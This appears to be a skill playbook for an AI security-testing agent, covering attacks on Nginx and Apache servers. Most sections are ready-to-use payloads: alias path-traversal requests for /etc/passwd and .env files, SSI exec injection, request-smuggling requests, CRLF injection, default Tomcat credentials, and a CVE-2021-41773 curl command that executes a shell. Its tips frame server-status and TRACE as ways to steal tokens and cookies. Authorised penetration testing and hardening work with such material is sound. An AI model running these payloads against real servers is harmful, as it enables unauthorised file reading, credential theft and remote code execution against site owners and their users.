<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: nginx-apache
description: Security testing playbook for Nginx and Apache web servers covering misconfigurations, path traversal, alias bypass, server-side includes, and common CVEs
---

# Nginx / Apache Web Server Security Testing

Web server misconfigurations are among the most common findings. Attack surface: directory listing, alias path traversal, open redirects, server-side includes, proxy header abuse, and known CVEs.

---

## Fingerprinting

    # Server header
    curl -I <target> | grep -i server
    # Server: nginx/1.18.0
    # Server: Apache/2.4.51 (Ubuntu)

    # X-Powered-By header:
    curl -I <target> | grep -i x-powered

    # Verbose error pages:
    GET /nonexistent → "404 Not Found nginx/1.18.0" (version disclosure)

    # Apache mod_status (very commonly exposed):
    GET /server-status                  # Full request log, worker status
    GET /server-status?auto             # Machine-readable format

    # Nginx status:
    GET /nginx_status                   # Active connections, requests/s

---

## Directory Listing

    # Apache: Options +Indexes enables listing
    GET /uploads/
    GET /backup/
    GET /logs/
    GET /files/
    GET /images/
    GET /css/
    GET /static/
    GET /assets/

    # Check if directory listing is on:
    curl -s <target>/uploads/ | grep -i "index of"

    # Nuclei:
    nuclei -t exposures/configs/apache-directory-listing.yaml -u <target>

---

## Apache Alias Traversal (Path Confusion)

Critical: `/alias/` configuration path traversal:

    # Vulnerable config:
    # Alias /static /var/www/static
    # (Note: no trailing slash on filesystem path)

    # Exploit: add extra slash to escape alias root
    GET /static../etc/passwd
    GET /static..%2fetc%2fpasswd

    # Vulnerable config 2:
    # Alias /static/ /var/www/html/static
    # ProxyPass /api/ http://backend:8080
    # No trailing slash on ProxyPass:
    GET /api../internal/config

---

## Nginx Alias Traversal (Path Confusion)

Most common Nginx misconfiguration:

    # Vulnerable Nginx config:
    # location /static {
    #     alias /var/www/app/static/;
    # }
    # (No trailing slash on location, has trailing slash on alias)

    # Exploit: traverse out of static directory
    GET /static../app/config.py
    GET /static../etc/passwd
    GET /static../app/.env

    # Test with slash:
    GET /static/../../etc/passwd     # If directory traversal not prevented
    GET /static%2F..%2F..%2Fetc%2Fpasswd

    # Safe config (both have trailing slash or both don't):
    # location /static/ { alias /var/www/app/static/; }  ← Safe

    # Automated test:
    nuclei -t misconfiguration/nginx-alias-traversal.yaml -u <target>

---

## Nginx Off-By-Slash (SSRF/Proxy Bypass)

    # Vulnerable Nginx proxy config:
    # location /api {
    #     proxy_pass http://backend/;
    # }
    # /api → http://backend//  (extra slash) — may bypass backend auth

    GET /api../internal           # Traversal to other backend paths
    GET /api/%2e%2e/internal

---

## Apache mod_status / mod_info Exposure

    # Full server status (CRITICAL — reveals all active requests, IPs, URLs)
    GET /server-status
    GET /server-status?auto
    GET /server-info           # mod_info: full Apache config dump

    # What /server-status reveals:
    # - All active HTTP requests (with parameters — may include auth tokens)
    # - Client IP addresses
    # - Worker states
    # - Request rate/throughput

---

## Apache Server-Side Includes (SSI Injection)

If the server parses SSI in user-controlled files:

    # SSI directives (if .shtml files or SSI enabled for .html):
    <!--#echo var="DATE_LOCAL"-->                    # Date disclosure
    <!--#exec cmd="id"-->                            # RCE
    <!--#include virtual="/etc/passwd"-->            # File read
    <!--#printenv-->                                 # Dump environment

    # Test: upload/inject SSI into any file that gets rendered server-side

---

## HTTP Request Smuggling (CWE-444)

Nginx/Apache as reverse proxy — front/back disagreement on request boundary:

    # CL.TE: Content-Length used by frontend, Transfer-Encoding by backend
    POST / HTTP/1.1
    Host: <target>
    Content-Length: 13
    Transfer-Encoding: chunked

    0

    SMUGGLED

    # TE.CL: Transfer-Encoding used by frontend, Content-Length by backend
    POST / HTTP/1.1
    Host: <target>
    Content-Length: 3
    Transfer-Encoding: chunked

    8
    SMUGGLED
    0

    # Detect: use Burp Suite HTTP Request Smuggler extension
    # Or: manual timing attack (send request, measure if next request is affected)

---

## Security Headers Analysis

    # Check for missing security headers
    curl -I <target> | grep -iE "strict-transport|x-frame|x-content-type|content-security|referrer|permissions|x-xss"

    # Common misconfigs:
    # Missing HSTS → SSL stripping
    # Missing X-Frame-Options → clickjacking
    # Missing CSP → XSS escalation
    # Missing X-Content-Type-Options → MIME sniffing

---

## Nginx Miscellaneous Misconfigurations

    # CRLF injection in redirect (old Nginx):
    GET /%0d%0aLocation:%20http://evil.com

    # Merge slashes off — allows bypassing path-based rules:
    GET //admin/              # Nginx merges by default; some configs don't
    GET ///admin///

    # IPv6 literal bypass (some WAFs/rules don't handle):
    GET http://[::1]/admin    # Loopback via IPv6

    # $uri vs $request_uri in try_files (XSS via header injection):
    # Vulnerable config: return 301 https://$host$uri;
    # Payload: /%0d%0aSet-Cookie:+session=attacker

---

## Apache Miscellaneous Misconfigurations

    # .htaccess parsing (if AllowOverride All):
    # Upload .htaccess to change configuration
    # Content: Options +Indexes or php_value auto_prepend_file /etc/passwd

    # Apache Tomcat (Java) alongside Apache HTTP:
    GET /manager/html           # Tomcat manager (common creds: tomcat:tomcat, admin:admin)
    GET /manager/status
    GET /host-manager/html

    # Apache mod_proxy open relay:
    GET http://evil.com/ HTTP/1.1
    Host: <target>
    # If proxy configured without ProxyRequests Off:
    # Target becomes an HTTP proxy to the internet

    # Options * method exposure:
    OPTIONS / HTTP/1.1
    Host: <target>
    # Response: Allow: GET, POST, OPTIONS, TRACE, DELETE, PUT...
    # TRACE enabled = XST (Cross-Site Tracing) attack possible

---

## Configuration File Exposure

    # Apache config exposure:
    GET /.htaccess                  # Apache per-directory config
    GET /.htpasswd                  # Basic auth credentials
    GET /web.config                 # IIS (if dual-server setup)

    # Nginx common config paths (if PHP/CGI exposed):
    GET /nginx.conf
    GET /etc/nginx/nginx.conf

    # Common backup configs:
    GET /nginx.conf.bak
    GET /nginx.conf.old
    GET /httpd.conf.bak
    GET /apache.conf.bak

---

## Common CVEs

| CVE | Product | Impact |
|-----|---------|--------|
| CVE-2021-41773 | Apache 2.4.49 | Path traversal + RCE |
| CVE-2021-42013 | Apache 2.4.49-50 | Path traversal (bypass of 41773 fix) |
| CVE-2019-0211 | Apache | Local privilege escalation |
| CVE-2017-7679 | Apache mod_mime | Buffer overflow |
| CVE-2013-2028 | Nginx 1.3.9-1.4.0 | Stack buffer overflow |

    # Test Apache path traversal CVE-2021-41773:
    curl -s --path-as-is <target>/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
    curl -s --path-as-is <target>/cgi-bin/.%2e/.%2e/bin/sh -d "echo;id"

    # Nuclei:
    nuclei -t cves/ -tags nginx,apache -u <target>

---

## Pro Tips

1. Nginx alias traversal (location without trailing slash) is extremely common — test `/static../`
2. `/server-status` exposes all active requests with parameters — goldmine for token theft
3. `.htaccess` upload enables changing Apache config (PHP handlers, auth bypass, SSI)
4. Apache CVE-2021-41773 (path traversal) is still unpatched on many production servers
5. Nginx off-by-slash proxy configs allow reaching backend paths outside intended prefix
6. HTTP request smuggling is highly effective behind Nginx/Apache reverse proxies
7. `OPTIONS` method returning `TRACE` = Cross-Site Tracing (XST) — steal HttpOnly cookies

## Summary

Nginx/Apache testing = alias traversal (Nginx path confusion) + directory listing + server-status exposure + security header audit. The Nginx alias traversal `location /static { alias /path/; }` is the most impactful server-specific finding. Apache `/server-status` is almost always accessible and leaks active requests including auth tokens. Always check both servers if a reverse proxy setup is suspected.
